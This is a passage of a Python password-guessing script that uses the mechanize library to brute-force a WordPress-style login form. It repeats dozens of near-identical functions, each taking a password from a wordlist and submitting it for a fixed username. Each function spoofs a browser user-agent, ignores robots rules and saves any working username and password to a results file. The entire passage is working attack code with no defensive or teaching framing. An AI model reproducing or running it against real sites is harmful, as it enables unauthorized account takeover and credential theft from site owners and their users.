        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x32():
    w1=k32.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x33():
    w1=k33.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x34():
    w1=k34.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x35():
    w1=k35.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x36():
    w1=k36.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x37():
    w1=k37.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x38():
    w1=k38.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x39():
    w1=k39.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x40():
    w1=k40.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x41():
    w1=k41.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x42():
    w1=k42.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x43():
    w1=k43.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x44():
    w1=k44.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x45():
    w1=k45.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x46():
    w1=k46.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x47():
    w1=k47.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x48():
    w1=k48.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x49():
    w1=k49.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x50():
    w1=k50.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x51():
    w1=k51.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x52():
    w1=k52.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x53():
    w1=k53.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x54():
    w1=k54.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x55():
    w1=k55.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x56():
    w1=k56.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x57():
    w1=k57.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x58():
    w1=k58.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x59():
    w1=k59.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x60():
    w1=k60.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x61():
    w1=k61.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x62():
    w1=k62.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x63():
    w1=k63.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x64():
    w1=k64.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x65():
    w1=k65.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
